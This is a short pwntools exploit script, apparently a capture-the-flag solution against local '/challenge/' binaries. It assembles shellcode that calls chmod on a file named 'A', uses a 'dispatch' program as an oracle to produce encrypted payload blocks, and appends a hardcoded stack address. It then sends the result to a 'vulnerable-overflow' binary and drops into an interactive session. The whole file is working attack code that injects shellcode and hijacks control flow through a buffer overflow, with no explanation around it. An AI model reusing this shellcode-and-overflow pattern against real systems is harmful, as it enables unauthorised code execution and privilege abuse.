from pwn import *
context.arch = "amd64"

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)


ciphertext = b""
p = process("/challenge/dispatch")
p.send(b"VERIFIED")
a1 = p.recv()
ciphertext += a1

p = process("/challenge/dispatch")
p.send(my_sc)
a = p.recv()
# a2=b""
# for i in range(len(a1)):
#     a2 += (a1[i] ^ a[i]).to_bytes(1, "little")
ciphertext += a

p = process("/challenge/dispatch")
p.send(b"VERIFIED" + 0x7fffffffe220.to_bytes(8, "little"))
a = p.recv()
# a3=b""
# for i in range(len(a1)):
#     a3 += (a2[i] ^ a[i]).to_bytes(1, "little")
ciphertext += a

p = process("/challenge/dispatch")
p.send(b"VERIFIED" + 0x7fffffffe220.to_bytes(8, "little"))
a = p.recv()
# a3=b""
# for i in range(len(a1)):
#     a3 += (a2[i] ^ a[i]).to_bytes(1, "little")
ciphertext += a


p = process("/challenge/vulnerable-overflow")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/vulnerable-overflow", gdbscript="source ./gef/gef.py")

p.send(ciphertext)
p.interactive()
